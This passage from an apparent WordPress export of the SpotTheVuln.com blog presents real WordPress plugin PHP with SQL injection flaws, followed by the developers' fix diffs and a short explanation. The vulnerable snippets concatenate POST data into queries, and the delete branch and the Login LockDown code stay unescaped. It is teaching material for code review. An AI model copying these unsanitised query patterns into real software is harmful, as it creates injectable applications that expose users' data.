   &lt;th scope="col"&gt;Amount of Clicks&lt;/th&gt;
   &lt;th scope="col"&gt;Manage&lt;/th&gt;
   &lt;/tr&gt;
      &lt;/thead&gt;
   &lt;tbody id="the-list"&gt;
?&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>835</wp:post_id>
		<wp:post_date>2010-05-10 08:00:45</wp:post_date>
		<wp:post_date_gmt>2010-05-10 15:00:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pictures</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/di9BnY]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[13c6c0ad599f8ed67d6d63cb16edc572]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>470</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Pictures &#8211; SQL Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/05/pictures-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-05-14 08:35:59</wp:comment_date>
			<wp:comment_date_gmt>2010-05-14 15:35:59</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Pictures [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Pictures – SQL Injection</title>
		<link>http://spotthevuln.com/2010/05/pictures-sql-injection/</link>
		<pubDate>Fri, 14 May 2010 15:00:51 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=839</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Short URL Plugin

Fixed in Version: 2.0

Issue Type: SQL Injection

Original Code: <a title="Pictures" href="http://spotthevuln.com/2010/05/pictures/" target="_blank">Found Here</a>
<h2>Description</h2>
This was a vulnerability that affected the Short URL Wordpress plugin.  The vulnerability is very straightforward and should have been easily detected by a security code reviewer.  The vulnerable code section takes attacker controlled data directly from $_POST[‘form_url’], $_POST[‘form_desc’], and $_POST[‘id’] and uses the tainted value immediately in dynamically built SQL statements.  One interesting piece of this particular code fix is that the developers chose to implement the code fixes near the assignment of the variable (as opposed to near consumption, in the SQL statement).

Another interesting piece of the code fix is the logic for the following conditional:
<blockquote>if($action == "delete"){</blockquote>
looks like the devs may have forgotten something :)
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php
require_once(ABSPATH . 'wp-admin/upgrade-functions.php');
   dbDelta($sql);
  
   }
   if(isset($_POST['action'])) {
      $action = $_POST['action'];

if($action == "create"){
-  $add_url = $_POST['form_url'];
-  $add_desc = $_POST['form_desc'];
+  $add_url = $wpdb-&gt;escape($_POST['form_url']);
+  $add_desc = $wpdb-&gt;escape($_POST['form_desc']);
   if($add_url == "http://" || (!$add_url)){ $ERR = $ERR . "&lt;br&gt;You must enter a URL to redirect to!"; }
   if(!$ERR){
      $wpdb-&gt;query("INSERT INTO $table_name (link_url,link_desc) VALUES ('$add_url','$add_desc')");
         $new_url = get_option("siteurl") . "/u/" . mysql_insert_id();
         $MES = $MES . "&lt;br&gt;The redirect URL has been added. Your new Short URL is: " . $new_url;
         }
      }

if($action == "edit"){
-  $edit_id = $_POST['id'];
-  $edit_url = $_POST['form_url'];
-  $edit_desc = $_POST['form_desc'];
+  $edit_id = $wpdb-&gt;escape($_POST['id']);
+  $edit_url = $wpdb-&gt;escape($_POST['form_url']);
+  $edit_desc = $wpdb-&gt;escape($_POST['form_desc']);
   if($edit_url == "http://" || (!$edit_url)){ $ERR = $ERR . "&lt;br&gt;You must enter a URL to redirect to!"; }
   if(!$ERR){
      $wpdb-&gt;query("UPDATE $table_name SET link_url='$edit_url',link_desc='$edit_desc' WHERE link_id = $edit_id");
         $MES = $MES . "&lt;br&gt;The redirect URL has been modified.";
         }
      }

  
if($action == "delete"){
   $delete_id = $_POST['id'];
   $wpdb-&gt;query("DELETE FROM $table_name WHERE link_id = '$delete_id'");
   $MES = $MES . "&lt;br&gt;Redirect deleted!";
   }
  
if($action == "clearall"){
        $wpdb-&gt;query("UPDATE $table_name SET link_count='0' WHERE link_count &gt; 0");
   $MES = $MES . "&lt;br&gt;Counts have been reset!";
   }
}
   ?&gt;
   &lt;div&gt;
   &lt;form method="post"&gt;
      &lt;h2&gt;Short URL Admin&lt;/h2&gt;
&lt;?php if($ERR){ echo "&lt;p&gt;" . $ERR . "&lt;/p&gt;"; }
if($MES){ echo "&lt;p&gt;" . $MES . "&lt;/p&gt;"; } ?&gt;
      &lt;p&gt;Short URL allows you to create shorter URL's and keeps track of how many
times a link has been clicked. It's useful for managing downloads, keeping track
of outbound links and for masking URL's. Clicking the Clear All Clicks button
will reset the count for each entry. Visit the &lt;a href="<a href="http://www.harleyquine.com/php-scripts/short-url-plugin/%22%3Eplugin">http://www.harleyquine.com/php-scripts/short-url-plugin/"&gt;plugin</a> page&lt;/a&gt; for more information about this plugin.&lt;/p&gt;

&lt;h2&gt;Current Redirects&lt;/h2&gt;
&lt;table&gt;
   &lt;thead&gt;
   &lt;tr&gt;
   &lt;th scope="col"&gt;Short URL (The URL to use)&lt;/th&gt;
   &lt;th scope="col"&gt;Real URL (Where it redirects to)&lt;/th&gt;
   &lt;th scope="col"&gt;Notes&lt;/th&gt;
   &lt;th scope="col"&gt;Amount of Clicks&lt;/th&gt;
   &lt;th scope="col"&gt;Manage&lt;/th&gt;
   &lt;/tr&gt;
      &lt;/thead&gt;
   &lt;tbody id="the-list"&gt;
?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>839</wp:post_id>
		<wp:post_date>2010-05-14 08:00:51</wp:post_date>
		<wp:post_date_gmt>2010-05-14 15:00:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pictures-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="consumption"><![CDATA[Consumption]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[926263f7b8a9f45d70748112c9dd9aaf]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/axNpMI]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Dont Know</title>
		<link>http://spotthevuln.com/2010/05/dont-know/</link>
		<pubDate>Mon, 17 May 2010 15:00:42 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=843</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I don't know how I do it, I really don't.</strong>
- Pete Sampras</blockquote>
[ccnLe_php]

&lt;?php
if (!function_exists('yak_calc_discount_price')) {
   /**
    * Calculate a price discount, or return 0 if not a pricing promotion
    */
   function yak_calc_price_discount($item_quantity, $price, $total_items, $total_price, $promo=null) {
       if ($promo != null) {
           if ($promo-&gt;promo_type == 'pricing_perc' || $promo-&gt;promo_type == 'pricing_perc_threshold') {
               return ($promo-&gt;value / 100.0) * $price;
            }
            else if ($promo-&gt;promo_type == 'pricing_val' || $promo-&gt;promo_type == 'pricing_val_threshold') {
                if ($total_price &gt; 0) {
                    $item_perc_of_total = $price / $total_price;
                    return $promo-&gt;value * $item_perc_of_total;
                }
            }
        }
       
        return 0;
    }
}

if (!function_exists('yak_calc_discount_shipping')) {
    /**
     * Calculate a shipping discount, or return 0 if not a shipping discount
     */
    function yak_calc_shipping_discount($shipping_cost, $promo=null) {
        if ($promo != null) {
            if ($promo-&gt;promo_type == 'shipping_perc'  || $promo-&gt;promo_type == 'shipping_perc_threshold') {
                return ($promo-&gt;value / 100.0) * $shipping_cost;
            }
            else if ($promo-&gt;promo_type == 'shipping_val' || $promo-&gt;promo_type == 'shipping_val_threshold') {
                return $promo-&gt;value;
            }
        }
      
        return 0;
    }
}
if (!function_exists('yak_get_promotion')) {
    function yak_get_promotion($code) {
        $promos = yak_get_promotions($code, true);
        if (sizeof($promos) &gt;= 1) {
            return $promos[0];
        }
        else {
            return new YakPromotion('', null, null, null, 0, '', '', null);
        }
    }
}
if (!function_exists('yak_get_promotion_by_threshold')) {
    function yak_get_promotion_by_threshold($threshold) {
        $promos = yak_get_promotions(null, true, $threshold);
        if (sizeof($promos) &gt;= 1) {
            return $promos[0];
        }
        else {
            return null;
        }
    }
}
if (!function_exists('yak_get_promotions')) {
    function yak_get_promotions($code = null, $valid = false, $threshold = null) {
        global $wpdb;
      
        $registry =&amp; Registry::getInstance();
        $promo_table =&amp; $registry-&gt;get('promo_table');
        $promo_users_table =&amp; $registry-&gt;get('promo_users_table');
      
        $sql = "select promo_id, code, promo_type, description, threshold, value, expiry_date
                from $promo_table
                where 1 = 1 ";
      
        // search by code      
        if (!empty($code)) {
            $sql .= "and code = '$code' ";
            $sql .= "and promo_type in ('shipping_perc', 'shipping_val', 'pricing_perc', 'pricing_val') ";
        }
        // or search by threshold
        else if (!empty($threshold)) {
            $sql .= "and threshold is not null and $threshold &gt; threshold ";
            $sql .= "and promo_type in ('shipping_perc_threshold', 'shipping_val_threshold', 'pricing_perc_threshold', 'pricing_val_threshold') ";
        }
      
        // check for validity
        if ($valid) {
           $sql .= "and (expiry_date is null or expiry_date &gt;= current_date) ";
       }
     
       // final sql
       if (!empty($threshold)) {
           $sql .= "order by threshold desc limit 1";
       }
        else {
            $sql .= "order by promo_id asc";
        }
      
        $results = $wpdb-&gt;get_results($sql);
      
        $promos = array();
        foreach ($results as $result) {
            $rows = $wpdb-&gt;get_results("select user_nicename
                                        from $wpdb-&gt;users u
                                        where exists (select 1
                                                       from $promo_users_table pu
                                                       where pu.promo_id = $result-&gt;promo_id
                                                       and pu.user_id = u.ID)");
            $users = array();
            foreach ($rows as $row) {
                $users[] = $row-&gt;user_nicename;
            }
            $promo = new YakPromotion($result-&gt;promo_id, $result-&gt;code, $result-&gt;promo_type, $result-&gt;threshold, $result-&gt;value,
                                    $result-&gt;description, $result-&gt;expiry_date, $users);
            $promos[] = $promo;
        }
      
        return $promos;
    }
}
?&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>843</wp:post_id>
		<wp:post_date>2010-05-17 08:00:42</wp:post_date>
		<wp:post_date_gmt>2010-05-17 15:00:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>dont-know</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[6dbb180dd411641be57032eb5b20df5a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Dont Know]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Dont Know]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bowFod]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>472</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Dont Know &#8211; SQL Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/05/dont-know-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-05-21 08:05:23</wp:comment_date>
			<wp:comment_date_gmt>2010-05-21 15:05:23</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Dont Know [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Dont Know - SQL Injection</title>
		<link>http://spotthevuln.com/2010/05/dont-know-sql-injection/</link>
		<pubDate>Fri, 21 May 2010 15:00:21 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=849</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Yak for Wordpress

Fixed in Version: 2.1.0

Issue Type: SQL Injection

Original Code: <a title="Dont Know" href="http://spotthevuln.com/2010/05/dont-know/" target="_blank">Found  Here</a>
<h2>Description</h2>
This example covers a SQL injection in the YAK for Wordpress plugin. YAK is a shopping cart plugin for WordPress which associates products with weblog entries.  Shopping carts are the favorite of many web hackers as they typically contain security flaws due to the nature and exposed functionality of shopping carts.  The <a title="Web Application Hackers Handbook" href="http://www.amazon.com/dp/0470170778" target="_blank">Web Application Hackers Handbook</a> (by Dafydd Stuttard aka <a title="Portswigger" href="http://portswigger.net/" target="_blank">Portswigger</a>) has some excellent examples of typically flaws that can be associated with online shopping carts as well as some techniques to exploit those flaws... highly recommended if you don't have it already!

Looking at the code in this example, we see a classic SQL Injection through SQL statement string building.  There are several places where the YAK plugin developer takes user controlled values and uses those values as part of a dynamic SQL query.  The bright spot in this code fix is once the vulnerabilities were discovered, the developer made use of prepared statements (they utilized the wordpress prepared statement functions) to address the vulnerabilities.  An advantage to using prepared statements (as opposed to input validation before using a value in a dynamic SQL statement) is the developer doesn’t have to worry about missing some malicious character sequence or being too restrictive with legitimate data.
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php
if (!function_exists('yak_calc_discount_price')) {
/**
* Calculate a price discount, or return 0 if not a pricing promotion
*/
function yak_calc_price_discount($item_quantity, $price, $total_items, $total_price, $promo=null) {
if ($promo != null) {
if ($promo-&gt;promo_type == 'pricing_perc' || $promo-&gt;promo_type == 'pricing_perc_threshold') {
return ($promo-&gt;value / 100.0) * $price;
}
else if ($promo-&gt;promo_type == 'pricing_val' || $promo-&gt;promo_type == 'pricing_val_threshold') {
if ($total_price &gt; 0) {
$item_perc_of_total = $price / $total_price;
return $promo-&gt;value * $item_perc_of_total;
}
}
}

return 0;
}
}

if (!function_exists('yak_calc_discount_shipping')) {
/**
* Calculate a shipping discount, or return 0 if not a shipping discount
*/
function yak_calc_shipping_discount($shipping_cost, $promo=null) {
if ($promo != null) {
if ($promo-&gt;promo_type == 'shipping_perc'  || $promo-&gt;promo_type == 'shipping_perc_threshold') {
return ($promo-&gt;value / 100.0) * $shipping_cost;
}
else if ($promo-&gt;promo_type == 'shipping_val' || $promo-&gt;promo_type == 'shipping_val_threshold') {
return $promo-&gt;value;
}
}

return 0;
}
}


if (!function_exists('yak_get_promotion')) {
function yak_get_promotion($code) {
$promos = yak_get_promotions($code, true);
if (sizeof($promos) &gt;= 1) {
return $promos[0];
}
else {
return new YakPromotion('', null, null, null, 0, '', '', null);
}
}
}


if (!function_exists('yak_get_promotion_by_threshold')) {
function yak_get_promotion_by_threshold($threshold) {
$promos = yak_get_promotions(null, true, $threshold);
if (sizeof($promos) &gt;= 1) {
return $promos[0];
}
else {
return null;
}
}
}


if (!function_exists('yak_get_promotions')) {
function yak_get_promotions($code = null, $valid = false, $threshold = null) {
global $wpdb;

$registry =&amp; Registry::getInstance();
$promo_table =&amp; $registry-&gt;get('promo_table');
$promo_users_table =&amp; $registry-&gt;get('promo_users_table');

+    $args = array();
$sql = "select promo_id, code, promo_type, description, threshold, value, expiry_date
from $promo_table
where 1 = 1 ";

// search by code
if (!empty($code)) {
-           $sql .= "and code = '$code' ";
+        $sql .= "and code = %s ";
$sql .= "and promo_type in ('shipping_perc', 'shipping_val', 'pricing_perc', 'pricing_val') ";
+        $args[] = $code;
}
// or search by threshold
else if (!empty($threshold)) {
-           $sql .= "and threshold is not null and $threshold &gt; threshold ";
+        $sql .= "and threshold is not null and %f &gt; threshold ";
$sql .= "and promo_type in ('shipping_perc_threshold', 'shipping_val_threshold', 'pricing_perc_threshold',

'pricing_val_threshold') ";
+        $args[] = $threshold;
}

// check for validity
if ($valid) {
$sql .= "and (expiry_date is null or expiry_date &gt;= current_date) ";
}

// final sql
if (!empty($threshold)) {
$sql .= "order by threshold desc limit 1";
}
else {
$sql .= "order by promo_id asc";
}

+    $sql = $wpdb-&gt;prepare($sql, $args);
$results = $wpdb-&gt;get_results($sql);

$promos = array();
foreach ($results as $result) {
-           $rows = $wpdb-&gt;get_results("select user_nicename
-                                       from $wpdb-&gt;users u
-                                       where exists (select 1
-                                                      from $promo_users_table pu
-                                                      where pu.promo_id = $result-&gt;promo_id
-                                                      and pu.user_id = u.ID)");
+           $sql = $wpdb-&gt;prepare("select user_nicename
+                                       from $wpdb-&gt;users u
+                                       where exists (select 1
+                                                      from $promo_users_table pu
+                                                      where pu.promo_id = %d
+                                                     and pu.user_id = u.ID)", $result-&gt;promo_id);
+           $rows = $wpdb-&gt;get_results($sql);
$users = array();
foreach ($rows as $row) {
$users[] = $row-&gt;user_nicename;
}
$promo = new YakPromotion($result-&gt;promo_id, $result-&gt;code, $result-&gt;promo_type, $result-&gt;threshold, $result-

&gt;value,
$result-&gt;description, $result-&gt;expiry_date, $users);
$promos[] = $promo;
}

return $promos;
}
}
?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>849</wp:post_id>
		<wp:post_date>2010-05-21 08:00:21</wp:post_date>
		<wp:post_date_gmt>2010-05-21 15:00:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>dont-know-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cPf6Pd]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9238e6c89d4931f3bcf38530137149dc]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Dont Know - SQL Injection]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Dont Know - SQL Injection]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Widths</title>
		<link>http://spotthevuln.com/2010/05/widths/</link>
		<pubDate>Mon, 24 May 2010 15:00:29 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=863</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>A lot of people are afraid of heights. Not me, I'm  afraid of widths.
- Steven Wright</strong></blockquote>
[ccnLe_php]&lt;?php

function print_loginlockdownAdminPage() {

global $wpdb;

$table_name = $wpdb-&gt;prefix . "lockdowns";

$loginlockdownAdminOptions = get_loginlockdownOptions();

if (isset($_POST['update_loginlockdownSettings'])) {

if (isset($_POST['ll_max_login_retries'])) {

$loginlockdownAdminOptions['max_login_retries'] = $_POST['ll_max_login_retries'];

}

if (isset($_POST['ll_retries_within'])) {

$loginlockdownAdminOptions['retries_within'] = $_POST['ll_retries_within'];

}

if (isset($_POST['ll_lockout_length'])) {

$loginlockdownAdminOptions['lockout_length'] = $_POST['ll_lockout_length'];

}

if (isset($_POST['ll_lockout_invalid_usernames'])) {

$loginlockdownAdminOptions['lockout_invalid_usernames'] = $_POST['ll_lockout_invalid_usernames'];

}

if (isset($_POST['ll_mask_login_errors'])) {

$loginlockdownAdminOptions['mask_login_errors'] = $_POST['ll_mask_login_errors'];

}

update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);

?&gt;

&lt;div class="updated"&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Settings Updated.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php

}

if (isset($_POST['release_lockdowns'])) {

if (isset($_POST['releaseme'])) {

$released = $_POST['releaseme'];

foreach ( $released as $release_id ) {

$results = $wpdb-&gt;query("UPDATE $table_name SET release_date = now() " .

"WHERE lockdown_ID = $release_id");

}

}

update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);

?&gt;

&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Lockdowns Released.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php

}

$dalist = listLockedDown();

?&gt;

&lt;div&gt;

&lt;form method="post" action="&lt;?php echo $_SERVER["REQUEST_URI"]; ?&gt;"&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>863</wp:post_id>
		<wp:post_date>2010-05-24 08:00:29</wp:post_date>
		<wp:post_date_gmt>2010-05-24 15:00:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>widths</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
